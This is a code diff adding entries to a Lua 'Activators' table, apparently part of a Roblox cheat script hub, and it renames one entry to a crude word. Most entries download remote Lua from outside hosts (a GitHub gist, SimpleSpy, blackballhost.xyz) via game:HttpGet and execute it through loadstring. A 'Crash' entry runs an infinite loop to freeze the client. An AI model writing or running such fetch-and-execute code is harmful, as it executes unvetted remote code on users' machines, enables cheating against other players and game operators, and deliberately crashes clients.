@@ -28,11 +28,34 @@ local Activators = {
 	};
 	
 	["Bobs"] = {
-		["Name"] = "Bobs";
+		["Name"] = "Boobs";
 		["Function"] = function()
 			local Settings = { Collisions = false, Simulate_Physics_On_LocalPlayer_Only = false, ForceAllRigs = false, Only_Others = false }
 			--ForceAllRigs is basically forcing the changes on all humanoids that it finds
 			loadstring(game:HttpGet("https://gist.githubusercontent.com/htt-py/92db22eeefad0042a6da9117501ad827/raw/BBies.luau", true))(Settings)
+		end;
+	};
+	
+	["RSPY"] = {
+		["Name"] = "RemoteSpy V3";
+		["Function"] = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
+		end;
+	};
+	
+	["SSU"] = {
+		["Name"] = "Sirius Sense UI";
+		["Function"] = function()
+			loadstring(game:HttpGet('https://blackballhost.xyz/s/Sirius-Sense-UI.lua'))()
+		end;
+	};
+	
+	["Crash"] = {
+		["Name"] = "Crash";
+		["Function"] = function()
+			while true do
+			
+			end
 		end;
 	};
 }
